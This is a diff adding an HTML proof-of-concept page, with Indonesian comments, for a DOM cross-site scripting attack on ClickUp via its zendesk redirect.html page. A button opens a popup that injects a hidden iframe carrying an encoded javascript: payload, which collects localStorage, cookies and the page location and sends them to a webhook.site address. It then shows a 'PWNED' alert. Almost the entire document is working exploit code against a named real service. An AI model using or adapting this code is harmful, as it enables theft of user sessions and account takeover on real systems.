@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head><title>ClickUp DOM XSS PoC</title></head>
+<body>
+<h1>ClickUp DOM XSS via redirect.html + postMessage()</h1>
+<p>Klik tombol → XSS jalan → steal localStorage + cookies</p>
+<button onclick="exploit()">TRIGGER XSS</button>
+
+<script>
+function exploit() {
+  const payload = `
+    <script>
+      // Bypass semua filter dangerousProtocols & allowedDomains
+      const evil = "javascript:eval(atob('${btoa(`
+        // STEAL SEMUA DATA
+        const data = {
+          localStorage: JSON.stringify(localStorage),
+          cookies: document.cookie,
+          url: location.href,
+          origin: location.origin
+        };
+        
+        // Kirim ke attacker
+        fetch('https://webhook.site/2c1d7ce8-a03c-4f27-9b1c-8919a32bd492/clickup-pwn', {
+          method: 'POST',
+          body: JSON.stringify(data),
+          headers: {'Content-Type': 'application/json'}
+        });
+        
+        // Alert biar keliatan
+        alert('PWNED! Check webhook.site');
+      `)}'))";
+      
+      // Bikin iframe invisible
+      const iframe = document.createElement('iframe');
+      iframe.src = 'https://zendesk.clickup.com/redirect.html?go=' + encodeURIComponent(evil);
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+    <\/script>
+  `;
+
+  // Buka popup
+  const win = window.open('', '_blank', 'width=600,height=400');
+  win.document.write(payload);
+}
+</script>
+</body>
+</html>
